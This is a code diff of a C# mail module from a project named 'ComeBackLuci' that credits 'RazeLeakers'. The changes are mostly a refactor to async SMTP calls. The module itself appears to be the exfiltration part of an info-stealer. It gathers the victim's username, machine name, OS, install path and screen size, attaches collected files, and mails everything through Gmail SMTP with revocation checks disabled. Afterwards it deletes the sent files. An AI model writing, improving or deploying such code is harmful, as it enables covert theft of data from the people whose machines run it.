@@ -1,91 +1,79 @@
 ﻿using System;
 using System.IO;
 using System.Windows.Forms;
+using System.Threading.Tasks;
 using System.Collections.Generic;
 using MimeKit;
 using MailKit.Net.Smtp;
 using MailKit.Security;
 using ComeBackLuci.Properties;
-using static ComeBackLuci.MGLOBAL;
 
 namespace ComeBackLuci
 {
-    public static class MGLOBAL
-    {
-        public const string SERVER = "smtp.gmail.com";
-        public const int PORT = 587;
-
-        public static string GetEmailName(string email)
-        {
-            int limit = email.IndexOf('@');
-
-            return limit != -1 ? email.Substring(0, limit) : email;
-        }
-    }
-
     public class MailAttachment : IDisposable
     {
         public MimePart FileConfig { get; set; }
 
         public FileStream FileData { get; set; }
 
-        public MailAttachment(MimePart fconfig, FileStream fdata)
+        public MailAttachment(FileStream fileData,MimePart fileConfig)
         {
-            this.FileConfig = fconfig;
-
-            this.FileData = fdata;
+            this.FileData = fileData;
+            this.FileConfig = fileConfig;
         }
 
         public void Dispose()
         {
-            FileConfig?.Dispose();
-
             FileData?.Dispose();
+            FileConfig?.Dispose();
         }
     }
 
     public class MailManager : IDisposable
     {
-        private List<MailAttachment> _attachments;
+        private List<MailAttachment> _Attachments;
 
-        private MimeMessage _message;
-        private Multipart _mixer;
+        private MimeMessage _Message;
+        private Multipart _Mixer;
         private TextPart _body;
 
-        private string _user;
-        private string _password;
+        private string _User;
+        private string _Password;
+
+        private const string SERVER = "smtp.gmail.com";
+        private const int PORT = 587;
 
         public MailManager(string email,string password,bool sendMe = false)
         {
-            this._user = email;
-            this._password = password;
+            this._User = email;
+            this._Password = password;
 
             this._body = new TextPart("plain") { Text = $"Install path: {Application.StartupPath}\nOS: {Environment.OSVersion}\nUser: {Environment.UserName}\nMachine: {Environment.MachineName}\nProcessor: {Environment.ProcessorCount}\nScreen: {Screen.PrimaryScreen.Bounds.Size.Width} x {Screen.PrimaryScreen.Bounds.Size.Height}\n\ngithub.com/RazeLeakers | M3RFR3T & RESTART2LIFE" };
 
-            this._mixer = new Multipart();
+            this._Mixer = new Multipart();
 
-            this._message = new MimeMessage() { Subject = "ComeBackLuci" };
+            this._Message = new MimeMessage() { Subject = "ComeBackLuci" };
 
             string ename = GetEmailName(email);
 
-            this._message.From.Add(new MailboxAddress(ename, _user));
-            if (sendMe) this._message.To.Add(new MailboxAddress(ename, _user));
+            this._Message.From.Add(new MailboxAddress(ename, _User));
+            if (sendMe) this._Message.To.Add(new MailboxAddress(ename, _User));
 
-            this._attachments = new List<MailAttachment>();
+            this._Attachments = new List<MailAttachment>();
         }
 
         public void AddRecipient(string recipMail)
         {
             if (string.IsNullOrWhiteSpace(recipMail)) return;
 
-            _message.To.Add(new MailboxAddress(GetEmailName(recipMail), recipMail));
+            _Message.To.Add(new MailboxAddress(GetEmailName(recipMail), recipMail));
         }
 
         public void SetSubject(string subject)
         {
             if (string.IsNullOrWhiteSpace(subject)) return;
 
-            _message.Subject = subject;
+            _Message.Subject = subject;
         }
 
         public void SetBody(string content)
@@ -112,34 +100,35 @@ namespace ComeBackLuci
                 FileName = Path.GetFileName(filePath)
             };
 
-            _attachments.Add(new MailAttachment(mp, fs));
+            _Attachments.Add(new MailAttachment(fs, mp));
         }
 
-        public void Send(bool debug = false)
+        public async Task Send(bool debug = false)
         {
             AddErrorAttachments();
 
-            if (_attachments.Count > 0)
+            if (_Attachments.Count > 0)
             {
-                _mixer.Clear();
+                _Mixer.Clear();
 
-                _mixer.Add(_body);
+                _Mixer.Add(_body);
 
-                _attachments.ForEach((e) => _mixer.Add(e.FileConfig));
+                _Attachments.ForEach((e) => _Mixer.Add(e.FileConfig));
 
-                _message.Body = _mixer;
+                _Message.Body = _Mixer;
             }
-            else _message.Body = _body;
+            else _Message.Body = _body;
 
             try
             {
                 using (SmtpClient client = new SmtpClient())
                 {
                     client.CheckCertificateRevocation = false;
-                    client.Connect(SERVER, PORT, SecureSocketOptions.StartTls);
-                    client.Authenticate(_user, _password);
-                    client.Send(_message);
-                    client.Disconnect(true);
+
+                    await client.ConnectAsync(SERVER, PORT, SecureSocketOptions.StartTls);
+                    await client.AuthenticateAsync(_User, _Password);
+                    await client.SendAsync(_Message);
+                    await client.DisconnectAsync(true);
                 }
 
                 DeleteAttachments();
@@ -152,6 +141,13 @@ namespace ComeBackLuci
 
                 if (debug) MessageBox.Show($"ERROR:{Environment.NewLine}{ex.Message}", "ComeBackLuci", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
+        }
+
+        private string GetEmailName(string email)
+        {
+            int limit = email.IndexOf('@');
+
+            return limit != -1 ? email.Substring(0, limit) : email;
         }
 
         private string GetErrorDir()
@@ -182,7 +178,7 @@ namespace ComeBackLuci
         {
             string errorDir = GetErrorDir();
 
-            _attachments.ForEach(e =>
+            _Attachments.ForEach(e =>
             {
                 string fname = e.FileData.Name;
 
@@ -207,7 +203,7 @@ namespace ComeBackLuci
 
         private void DeleteAttachments()
         {
-            _attachments.ForEach((e) =>
+            _Attachments.ForEach((e) =>
             {
                 string fname = e.FileData.Name;
 
@@ -216,22 +212,22 @@ namespace ComeBackLuci
                 File.Delete(fname);
             });
 
-            _attachments.Clear();
+            _Attachments.Clear();
         }
 
         private void ClearAttachments()
         {
-            _attachments.ForEach((e) => e.Dispose());
-            _attachments.Clear();
+            _Attachments.ForEach((e) => e.Dispose());
+            _Attachments.Clear();
         }
 
         public void Dispose()
         {
             _body?.Dispose();
 
-            _mixer?.Dispose();
+            _Mixer?.Dispose();
 
-            _message?.Dispose();
+            _Message?.Dispose();
 
             ClearAttachments();
         }
